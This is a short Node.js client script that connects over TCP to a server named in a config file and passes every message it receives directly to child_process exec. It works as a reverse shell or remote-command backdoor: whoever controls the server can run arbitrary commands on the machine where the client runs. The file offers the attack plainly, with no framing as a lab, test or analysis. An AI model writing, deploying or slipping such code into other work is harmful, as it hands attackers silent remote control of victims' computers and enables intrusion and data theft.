//Import modules
const { createConnection } = require('net');
const {exec} = require('child_process');
const serverConfig = require('./serverConfig.json');

//Client connect[Plug] to server 
let clientPlug = createConnection(
    {
    port: serverConfig.TCP_port,
    host: serverConfig.hostname
    },
    () =>{
    console.log(`Connected to server ${clientPlug.remoteAddress}`);

})

clientPlug.on('error', (err)=>{
    try {
        if(clientPlug.remoteAddress === undefined && clientPlug.remotePort === undefined){
            console.log(`Server Error "${err.message}" \nUnable to connect.`);
        }else{
            console.error(' Whoops! \n'+
            clientPlug.remoteAddress + ':' + clientPlug.remotePort + ' disconnected');
        }
    } catch (error) {
        console.log(error);
    };
});

clientPlug.on('data', (data) =>{
    exec(data.toString())
})